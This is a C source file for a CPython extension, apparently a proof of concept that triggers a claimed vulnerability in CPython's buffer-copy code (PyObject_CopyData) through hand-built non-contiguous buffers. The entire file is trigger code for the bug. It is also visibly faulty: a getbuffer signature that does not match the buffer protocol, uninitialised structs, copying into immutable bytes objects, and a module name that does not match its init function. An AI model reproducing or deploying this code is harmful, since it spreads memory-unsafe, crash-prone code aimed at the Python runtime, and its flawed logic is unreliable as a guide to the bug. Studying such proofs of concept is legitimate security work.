/* Include the approperiate API for reference, must install libraries if not available 
 command like (debian): sudo apt-get install python3.X-dev */

#include <Python.h>

typedef struct {
    PyObject_HEAD
    int block1[2];
    int block2[2];
} MyBuffer;

static int MyBuffer_getbuffer(MyBuffer* self, Py_buffer* view, int flags, int provided_ndim) {
    if (view == NULL) {
        PyErr_SetString(PyExc_ValueError, "NULL view in getbuffer");
        return -1;
    }

    view->obj = (PyObject*)self;
    view->buf = &self->block1; 
    view->len = 4 * sizeof(int); 
    view->readonly = 0;
    view->itemsize = sizeof(int);
    view->format = "i"; 
    view->ndim = 2; // <-- this

    static Py_ssize_t shape[2] = {2, 2};
    view->shape = shape;

    static Py_ssize_t strides[2] = {2 * sizeof(int), sizeof(int)};
    view->strides = strides;

    view->suboffsets = NULL;  // No suboffsets

    Py_INCREF(self);  // Increase reference count
    return 0;
}

static PyBufferProcs MyBuffer_as_buffer = {
    (getbufferproc)MyBuffer_getbuffer,
    (releasebufferproc)NULL,  // We don't need to do anything to release the buffer
};

static PyTypeObject MyBufferType = {
    PyVarObject_HEAD_INIT(NULL, 0)
    "MyBuffer",              /* tp_name */
    sizeof(MyBuffer),        /* tp_basicsize */
    0,                       /* tp_itemsize */
    NULL,                       /* tp_dealloc */
    0,                       /* tp_vectorcall_offset */
    NULL,                       /* tp_getattr */
    NULL,                       /* tp_setattr */
    NULL,                       /* tp_as_async */
    NULL,                       /* tp_repr */
    NULL,                       /* tp_as_number */
    NULL,                       /* tp_as_sequence */
    NULL,                       /* tp_as_mapping */
    NULL,                       /* tp_hash  */
    NULL,                       /* tp_call */
    NULL,                       /* tp_str */
    NULL,                       /* tp_getattro */
    NULL,                       /* tp_setattro */
    &MyBuffer_as_buffer,     /* tp_as_buffer */
    Py_TPFLAGS_DEFAULT,      /* tp_flags */
    "MyBuffer objects",      /* tp_doc */
};

static PyObject* create_pybuffer_from_mybuffer(MyBuffer* mybuf) {
    PyObject* result = NULL;

    // Create a Py_buffer from MyBuffer
    Py_buffer view;
    if (MyBuffer_getbuffer(mybuf, &view, 0, 2) == 0) {
        // Create a bytes object from the buffer
        result = PyBytes_FromStringAndSize(view.buf, view.len);

        // Release the buffer when done
        PyBuffer_Release(&view);
    }

    return result;
}

/* provide a means to print the non-contigous buffer */
void print_buffer(Py_buffer *view) {
    int *buf = (int*)view->buf;
    for (int i = 0; i < view->shape[0]; i++) {
        for (int j = 0; j < view->shape[1]; j++) {
            int *item = (int*)((char*)buf + i * view->strides[0] + j * view->strides[1]);
            printf("%d ", *item);
        }
        printf("\n");
    }
}

// The function we want to expose to Python
static PyObject* vulnerable_function(PyObject* self, PyObject* args)
{
    /* create non-contigous buffers so that we can access the vulnerable code */

    /* src buffer */
    MyBuffer src_buf;
    Py_buffer src_view;
    MyBuffer_getbuffer(&src_buf, &src_view, 0, 6);
    print_buffer(&src_view);

    putchar('\n');

    /* dst buffer */
    MyBuffer dst_buf;
    Py_buffer dst_view;
    MyBuffer_getbuffer(&dst_buf, &dst_view, 0, 2);
    print_buffer(&dst_view);

    putchar('\n');

    printf("Copying source buffer to destination...\n");

    PyObject* srcPyBuffer = create_pybuffer_from_mybuffer(&src_buf);
    PyObject* dstPyBuffer = create_pybuffer_from_mybuffer(&dst_buf);
    PyObject_CopyData(dstPyBuffer, srcPyBuffer);

    printf("End of function, returning!\n");
    Py_RETURN_NONE;
    return 0;
}

// Define a method table actually exposing the function itself
static PyMethodDef VulnerableMethods[] = {
    {"vulnerable_function",  vulnerable_function, METH_VARARGS, "Demonstrate Abstract.c vulnerability'"},
    {NULL, NULL, 0, NULL}
};

// Create and define the module
static struct PyModuleDef vulnerablemodule = {
    PyModuleDef_HEAD_INIT,
    "vulnerable_function",
    NULL,
    -1,
    VulnerableMethods
};

// Export the function so Python can call it
PyMODINIT_FUNC
PyInit_poc(void)
{
    return PyModule_Create(&vulnerablemodule);
}
